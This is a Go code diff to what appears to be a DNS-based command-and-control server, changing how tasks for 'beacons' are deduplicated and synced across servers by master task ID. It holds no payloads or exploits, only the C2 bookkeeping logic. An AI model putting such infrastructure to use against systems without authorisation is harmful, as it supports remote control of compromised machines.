@@ -2114,6 +2114,15 @@ func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) s
 	// This ensures beacons use consistent task IDs when rotating between servers
 	taskID := masterTaskID
 
+	// Check if task already exists (don't re-add completed/failed tasks)
+	if existingTask, exists := c2.tasks[taskID]; exists {
+		// Task already synced, don't re-add
+		if c2.debug {
+			logf("[C2] Task %s already exists with status: %s", taskID, existingTask.Status)
+		}
+		return taskID
+	}
+
 	task := &Task{
 		ID:        taskID,
 		BeaconID:  beaconID,
@@ -2134,10 +2143,23 @@ func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) s
 		}(task)
 	}
 
-	// Add to beacon's task queue
+	// Add to beacon's task queue (only if beacon exists and not already queued)
 	if beacon, exists := c2.beacons[beaconID]; exists {
-		beacon.TaskQueue = append(beacon.TaskQueue, *task)
-		logf("[C2] Added task %s for beacon %s: %s", taskID, beaconID, command)
+		// Check if task is already in queue (prevent duplicates from re-sync)
+		alreadyQueued := false
+		for _, queuedTask := range beacon.TaskQueue {
+			if queuedTask.ID == taskID {
+				alreadyQueued = true
+				break
+			}
+		}
+
+		if !alreadyQueued {
+			beacon.TaskQueue = append(beacon.TaskQueue, *task)
+			logf("[C2] Added task %s for beacon %s: %s", taskID, beaconID, command)
+		} else if c2.debug {
+			logf("[C2] Task %s already queued for beacon %s (skipping duplicate)", taskID, beaconID)
+		}
 		return taskID
 	}
 
@@ -2225,23 +2247,11 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 	c2.mutex.Lock()
 	defer c2.mutex.Unlock()
 
-	// Find the local task ID that corresponds to this master task ID
-	var localTaskID string
-	for localID, masterID := range c2.masterTaskIDs {
-		if masterID == masterTaskID {
-			localTaskID = localID
-			break
-		}
-	}
-
-	// If we don't have a mapping, the task might have been created locally
-	// Try to find it by master task ID directly
-	if localTaskID == "" {
-		localTaskID = masterTaskID
-	}
+	// SHADOW MESH: We use Master task IDs directly, no mapping needed
+	taskID := masterTaskID
 
 	// Update the task status
-	task, exists := c2.tasks[localTaskID]
+	task, exists := c2.tasks[taskID]
 	if !exists {
 		if c2.debug {
 			logf("[DEBUG] Task %s not found locally (may have been created on different DNS server)", masterTaskID)
@@ -2255,21 +2265,20 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 		task.Status = status
 
 		if c2.debug {
-			logf("[DEBUG] Updated task %s status from master: %s → %s", localTaskID, oldStatus, status)
+			logf("[DEBUG] Updated task %s status from master: %s → %s", taskID, oldStatus, status)
 		}
 
 		// CRITICAL: Clear the beacon's current task so it can receive new tasks
 		if beacon, beaconExists := c2.beacons[task.BeaconID]; beaconExists {
-			if beacon.CurrentTask == localTaskID {
+			if beacon.CurrentTask == taskID {
 				beacon.CurrentTask = ""
 				if c2.debug {
-					logf("[DEBUG] Cleared current task for beacon %s (task %s marked %s by Master)", task.BeaconID, localTaskID, status)
+					logf("[DEBUG] Cleared current task for beacon %s (task %s marked %s by Master)", task.BeaconID, taskID, status)
 				}
 			}
 		}
 
-		// Clean up master task ID mapping
-		delete(c2.masterTaskIDs, localTaskID)
+		// No mapping cleanup needed - we use Master IDs directly
 
 		// Update database
 		if c2.db != nil {
@@ -2277,7 +2286,7 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 				if err := c2.db.UpdateTaskStatus(tid, st); err != nil && c2.debug {
 					logf("[C2] Failed to update task status in database: %v", err)
 				}
-			}(localTaskID, status)
+			}(taskID, status)
 		}
 	}
 }
